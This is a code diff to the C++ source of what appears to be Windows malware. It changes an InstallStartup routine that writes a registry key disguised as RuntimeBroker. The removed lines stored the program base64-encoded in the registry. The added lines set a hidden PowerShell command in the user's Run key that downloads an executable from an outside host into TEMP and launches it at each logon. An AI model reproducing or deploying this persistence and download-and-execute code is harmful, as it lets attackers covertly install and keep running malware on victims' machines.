@@ -1604,39 +1604,17 @@ static std::string Base64Encode(const BYTE* data, DWORD size) {
 #define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
 
 static void InstallStartup() {
-    char path[MAX_PATH];
-    GetModuleFileNameA(NULL, path, MAX_PATH);
-
-    // Read current exe into memory
-    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return;
-    DWORD size = GetFileSize(hFile, NULL);
-    if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(hFile); return; }
-    BYTE* buf = new BYTE[size];
-    DWORD read = 0;
-    if (!ReadFile(hFile, buf, size, &read, NULL) || read != size) {
-        delete[] buf; CloseHandle(hFile); return;
-    }
-    CloseHandle(hFile);
-
-    // Base64 encode and store in registry
-    std::string b64 = Base64Encode(buf, size);
-    delete[] buf;
-
     HKEY hKey;
     if (RegCreateKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, "Payload", 0, REG_SZ, (BYTE*)b64.c_str(), (DWORD)b64.size());
+        const char* marker = "1";
+        RegSetValueExA(hKey, "Payload", 0, REG_SZ, (BYTE*)marker, (DWORD)strlen(marker) + 1);
         RegCloseKey(hKey);
     }
 
-    // Set HKCU Run key with PowerShell loader
-    b64.clear();
-    std::string psCmd = "powershell -w h -c \"$d=(gp 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker').Payload;$p=$env:TEMP+'\\";
-    psCmd += GetExeName();
-    psCmd += "';[IO.File]::WriteAllBytes($p,[Convert]::FromBase64String($d));start $p\"";
+    std::string psCmd = "powershell -w h -c \"$p=$env:TEMP+'\\" + GetExeName() + "';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"";
 
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, GetExeName().c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size());
+        RegSetValueExA(hKey, GetExeName().c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size() + 1);
         RegCloseKey(hKey);
     }
 }
@@ -1768,6 +1746,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
     return 0;
 }
+
 
 
 
